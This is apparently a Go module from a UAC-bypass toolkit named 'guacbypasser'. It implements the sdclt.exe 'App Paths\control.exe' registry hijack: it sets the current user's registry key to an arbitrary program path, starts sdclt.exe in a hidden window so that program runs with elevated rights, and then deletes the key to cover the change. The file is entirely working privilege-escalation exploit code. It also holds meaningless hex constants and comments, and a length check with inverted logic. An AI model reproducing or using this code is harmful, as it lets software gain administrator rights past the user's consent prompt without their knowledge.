package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_Sdcltcontrol(path string) error {
	var wkey32 registry.Key
	var cmd *exec.Cmd
	var err error

	var c = __W32_Sdcltcontrol__{
		Type:   "_sdcltcontrol",
		Method: "registry-command",
		Scode: [4]uintptr{
			0x01, 0x0911c,
			0xebb, 0x037cb,
		},

		Location:        fmt.Sprintf("%s\\_sdcltcontrol.gUAC", os.Getenv("APPDATA")),
		_K_Sdcltcontrol: 0x6,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Println(err)
	}

	_, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.SET_VALUE)
	if err != nil {
		log.Println(err)
	}

	wkey32, err = registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		log.Println(err)
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	// +0x23df ...

	if err := wkey32.SetStringValue("", currentDir); err != nil {
		log.Println(err)
	}

	// Absolute key function closing
	// +0x54ef ...

	if err := wkey32.Close(); err != nil {
		log.Println(err)
	}

	// Sleep for 5 seconds ...
	time.Sleep(5 * 1 * time.Second)

	cmd = exec.Command("cmd", "/C", fmt.Sprintf("%s", "start sdclt.exe"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		log.Println(err)
	}

	// Sleep for 5 seconds ...
	time.Sleep(5 * 1 * time.Second)

	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`)
	if err != nil {
		log.Println(err)
	}

	return err
}
